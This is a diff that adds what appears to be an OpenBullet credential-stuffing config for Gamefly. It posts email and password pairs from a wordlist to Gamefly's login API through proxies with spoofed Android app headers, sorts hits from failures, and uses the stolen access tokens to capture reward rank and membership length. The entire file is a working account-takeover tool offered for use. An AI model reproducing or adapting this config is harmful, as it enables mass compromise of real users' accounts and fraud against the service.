@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "Gamefly",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-04T11:32:33.0856531+01:00",
+  "AdditionalInfo": "",
+  "Author": "Meowtit",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1914318627
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.gamefly.com/api/account/authenticate" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "User-Agent: GameFly Android v7.54 (com.gamefly.android.gamecenter)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Device-Instance-Id: d856780e-d59d-4cbc-8475-f4fada10f514" 
+  HEADER "X-Session-Id: 3c4376f1-463c-45cd-94f4-5045d1da8014" 
+  HEADER "X-Source: GCAN" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "requestSucceeded\":false" 
+  KEYCHAIN Success OR 
+    KEY "accessToken\":\"" 
+#PARSE_accessToken PARSE "<SOURCE>" LR "accessToken\":\"" "\"" -> VAR "accessToken" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Your account has been cancelled" 
+REQUEST GET "https://api.gamefly.com/api/AccountActivity/GetCurrentRewards" 
+  
+  HEADER "User-Agent: GameFly Android v7.54 (com.gamefly.android.gamecenter)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Device-Instance-Id: d856780e-d59d-4cbc-8475-f4fada10f514" 
+  HEADER "X-Session-Id: 3c4376f1-463c-45cd-94f4-5045d1da8014" 
+  HEADER "X-Source: GCAN" 
+  HEADER "Authorization: Bearer <accessToken>" 
+#PARSE_rewardLevelRank PARSE "<SOURCE>" LR "rewardLevelRank\":" ",\"" -> CAP "rewardLevelRank" 
+REQUEST GET "https://api.gamefly.com/api/AccountReactivation/GetRentalMembershipOptions" 
+  
+  HEADER "User-Agent: GameFly Android v7.54 (com.gamefly.android.gamecenter)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Device-Instance-Id: d856780e-d59d-4cbc-8475-f4fada10f514" 
+  HEADER "X-Session-Id: 3c4376f1-463c-45cd-94f4-5045d1da8014" 
+  HEADER "X-Source: GCAN" 
+  HEADER "Authorization: Bearer <accessToken>" 
+#PARSE_monthsOfExistingServiceTime PARSE "<SOURCE>" LR "monthsOfExistingServiceTime\":" ",\"" -> CAP "monthsOfExistingServiceTime" 
